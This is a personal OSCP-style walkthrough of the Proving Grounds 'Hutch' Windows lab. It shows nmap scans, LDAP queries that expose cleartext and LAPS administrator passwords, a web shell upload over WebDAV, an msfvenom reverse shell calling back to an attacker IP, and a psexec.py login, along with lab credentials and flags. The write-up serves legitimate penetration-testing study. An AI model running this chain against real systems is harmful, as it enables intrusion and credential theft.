---
Date: 2024-10-28
Course: "[[OSCP]]"
Platform: PG-Practice
Category: Windows
Difficulty: Intermediate
Status: Complete
IP: 192.168.171.122
Writeup: https://medium.com/@bdsalazar/proving-grounds-hutch-intermediate-windows-box-walkthrough-a-journey-to-offensive-security-40b98f5f170c
---
# Box
Rinse and repeat on the Windows bullshit here. Just like Authby, this was an exercise in absolute frustration yesterday - trying every possible exploit combination and following numerous walkthroughs - only for the entire thing to crack in a heartbeat tonight using the exact same tools and exploit I ran 24 hours earlier.

Once again this is a reminder that these Windows boxes are unbelievable unreliable and unstable, so if you're following the exact steps of a walkthrough and things are not working, then shut the box down and move on. There is absolutely no point bashing your head against a broken box, so let it go. 

I'm still feeling overwhelmed by all these services and open ports, but this one provided some interesting lessons in attacking both WebDav & LDAP without even having initial access. I'd never heard of `cadaver` before, but if I find user credentials then my next step will be to run `cadaver` as part of my enumeration going forward - it's as simple as putting `cadaver` in front of the target IP address and logging in!

`LDAPsearch` is a tool I never knew existed either, but holy hell is it great for throwing back users and passwords! I'd heard of `psexec.py` before this box, but never knew how to use it - with the admin password (or credentials for any user) it is absolutely the way to login to a target machine without remote management. I've added the `cadaver`, `LDAPsearch` and `psexe.py` to my Windows cheatsheet, and they will get used a LOT going forward.

# Resolution summary
- Ran Nmap to identify ports `53`,`80`, `88`, `135/445`, `389`, `593`, `636` & `3389` 
- Ran `LDAPsearch` to identify user credentials
- Used `cadaver` to login to Webdav share on target
- Uploaded `cmdasp.aspx` to web root, then navigated to uploaded page for command execution
- Ran `msfvenom` to create reverse shell executable, and uploaded via Webdav
- Used `cmdasp.aspx` to run reverse shell executable for initial access
- Accessed `shell.php` via browser and received reverse shell
- Ran `LDAPsearch` with user credentials to find administrator credentials
- Ran `psexec.py` with admin credentials to login and print `proof.txt`
## Improved skills
- Using cadaver, LDAPSearch, MSFVenom, and psexec.py
- skill 2
## Used tools
- nmap
- python
- psexec.py
- cadaver
- LDAPsearch
- MSFVenom
- Revshells

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -p- -v -oN Hutch.nmap 192.168.171.122
---
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49692/tcp open  unknown
```

Enumerated open TCP ports:
```bash
sudo nmap -p 53,80,88,135,139,445,464,593,636,3268,3269,5985,9389 -A 192.168.171.122 -oN hutch-tcp.nmap -v --script=vulners --script-args mincvss=9.8
---
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-27 06:56:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
---
# Enumeration
## Port 53 - Domain (Simple DNS Plus)
- Identified "Simple DNS Plus" - potentially vulnerable to CVE-2020-1350
	- https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228
## Port 80 - HTTP (Microsoft IIS)
- Navigated to `http://192.168.171.122:80` and identified default page for `Microsoft IIS` service
![[Cybersecurity-Resources/images/Pasted image 20241027170248.png]]
## Port 88 -  Kerberos (Microsoft Windows Kerberos)
No enumeration conducted
## Port 135 - MSRPC (Windows RPC)
No enumeration conducted
## Port 139 & 445 - SMB (Microsoft Windows netbios-ssn)
No enumeration conducted
## Port 389 & 3268/9 - LDAP (Microsoft Windows Active Directory)
- Ran `sudo nmap -n -sV -Pn -script 'ldap* and not brute' 192.168.171.122` to identify potenial scripts for LDAP - identified Domain Name `hutch.offsec`
![[Cybersecurity-Resources/images/Pasted image 20241027175147.png]]
- Ran `ldapsearch -v -x -b 'DC=hutch,DC=offsec' -H 'ldap://192.168.171.122' '(objectclass=*)'` to identify users
- Identified clear text credentials for `fmcsorley:CrabSharkJellyfish192` in user description
![[Cybersecurity-Resources/images/Pasted image 20241027175717.png]]
## Port 464 - Kerberos (Password Change)
No enumeration conducted
## Port 593 - ncacn_http
No enumeration conducted
## Port 636 - tcpwrapped
No enumeration conducted
## Port 5985 - http (Microsoft HTTPAPI httpd 2.0)
- Navigated to `192.168.171.122:5985` and identified `404 Not Found` page
![[Cybersecurity-Resources/images/Pasted image 20241027172925.png]]
## Ports 49666/8, 49674/6, 49692, 49756,  - MSRPC (Windows RPC)

---
# Exploitation
## Malicious File Upload
- Ran `cadaver http://192.168.171.122` & logged in with credentials `fmcsorley:CrabSharkJellyfish192` to access `WebDav`
- Ran `put /usr/share/webshells/aspx/cmdasp.aspx` to upload command web shell
![[Cybersecurity-Resources/images/Pasted image 20241027181048.png]]
- Navigated to `http://192.168.171.122/cmdasp.aspx` to confirm upload and test command execution
![[Cybersecurity-Resources/images/Pasted image 20241027181112.png]]
- Ran `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.199 LPORT=4444 -f exe > revshell2.exe` to create reverse shell executable
![[Cybersecurity-Resources/images/Pasted image 20241027181332.png]]
- Returned to `Cadaver` login and ran `/media/sf_Kali-Shared/Boxes/PG/Windows/Hutch/revshell2.exe` to upload to web server
![[Cybersecurity-Resources/images/Pasted image 20241027181541.png]]
- Started netcat listener on port `4444`, returned to web browser to execute `C:\inetpub\wwwroot\revshell2.exe` command, and caught reverse shell
![[Cybersecurity-Resources/images/Pasted image 20241028194223.png]]
- Ran `type C:\Users\fmcsorley\local.txt` to print `22d03ac1b79145247627d9e068667178`
![[Cybersecurity-Resources/images/Pasted image 20241028202217.png]]
---
# Privilege Escalation
## Psexe.py
- Ran `ldapsearch -x -H 'ldap://192.168.182.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd` to find administrator password `administrator:c)!ybbH7AN58p1`
![[Cybersecurity-Resources/images/Pasted image 20241028194935.png]]
- Ran `/usr/share/doc/python3-impacket/examples/psexec.py hutch.offsec/administrator:'c)!ybbH7AN58p1'@192.168.182.122` to login with psexec.py
![[Cybersecurity-Resources/images/Pasted image 20241028201233.png]]
- Ran `type C:\Users\Administrator\Desktop\proof.txt` to print `efd8e0e27039c18caf863001955304b3`
![[Cybersecurity-Resources/images/Pasted image 20241028202150.png]]
---
# Trophy & Loot
`local.txt` = `22d03ac1b79145247627d9e068667178`
`proof.txt` = `efd8e0e27039c18caf863001955304b3`